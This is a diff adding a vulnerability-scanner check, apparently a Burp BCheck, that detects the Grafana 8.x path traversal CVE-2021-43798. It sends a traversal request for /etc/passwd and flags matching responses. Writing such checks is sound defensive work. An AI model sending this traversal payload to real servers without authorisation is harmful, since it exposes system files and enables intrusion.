@@ -1,0 +1,22 @@
+metadata:
+  language: v1-beta
+  name: "CVE-2021-43798 - Grafana 8.x Path Traversal (Pre-Auth)"
+  description: "Grafana 8.x Path Traversal (Pre-Auth)"
+  author: "Gustavo Roberto a.k.a Robertux | Greetz: Ewerson Guimaraes a.k.a Crash"
+  tags: "grafana"
+
+run for each:
+  path_to_check = "/public/plugins/alertlist/../../../../../../../../etc/passwd"
+
+given host then
+  send request called checkPath:
+    method: "GET"
+    path: {path_to_check}
+
+    if {checkPath.response.body} matches "([a-zA-Z0-9:]+\/)(([:a-zA-Z0-9\/])+[\/a-zA-Z0-9])" then
+      report issue:
+        severity: high
+        confidence: firm
+        detail: `{checkPath.response.body}`
+        remediation: "Use the latest stable version of Grafana"
+    end if
